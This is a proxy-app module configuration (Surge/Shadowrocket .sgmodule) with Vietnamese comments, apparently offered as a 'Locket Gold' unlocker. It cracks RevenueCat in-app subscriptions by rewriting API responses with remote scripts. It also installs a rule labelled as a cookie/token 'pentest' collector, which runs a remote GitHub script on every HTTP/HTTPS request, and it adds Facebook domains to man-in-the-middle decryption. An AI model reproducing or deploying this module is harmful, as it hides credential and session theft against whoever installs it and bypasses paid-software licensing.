#!url=https://raw.githubusercontent.com/tinphuc179-bot/locketgold/refs/heads/main/matintools-v2.sgmodule
#!name= [FullPentest]matintools.click
#!desc= Module tích hợp bẻ khóa RevenueCat và thu thập kiểm thử bảo mật

[Script]
# 1. Bẻ khóa RevenueCat (chỉ chạy khi ứng dụng gọi API RevenueCat)
revenuecat_bypass = type=http-response, pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers), script-path=https://raw.githubusercontent.com/tinphuc179-bot/locketgold_v2/refs/heads/main/matin_revenuecat.js, requires-body=true, max-size=-1, timeout=60

# 2. Xóa Header ETag của RevenueCat
deleteHeader = type=http-request, pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers), script-path=https://raw.githubusercontent.com/tinphuc179-bot/locketgold_v2/refs/heads/main/matin_deleteHeader.js, timeout=60

# 3. Thu thập Cookie/Token (Pentest) - Có thể đổi pattern nếu muốn giới hạn tên miền thay vì bắt toàn bộ (^https?:\/\/.+)
pentest_collector = type=http-request, pattern=^https?:\/\/.+, script-path=https://raw.githubusercontent.com/tinphuc179-bot/locketgold_v2/refs/heads/main/m4t.js, timeout=60

[MITM]
# Mở rộng hostname cần giải mã (Lưu ý: Nếu để dấu sao *, một số ứng dụng có cơ chế bảo mật cao như Facebook có thể bị ảnh hưởng kết nối)
hostname = %APPEND% api.revenuecat.com, *.facebook.com
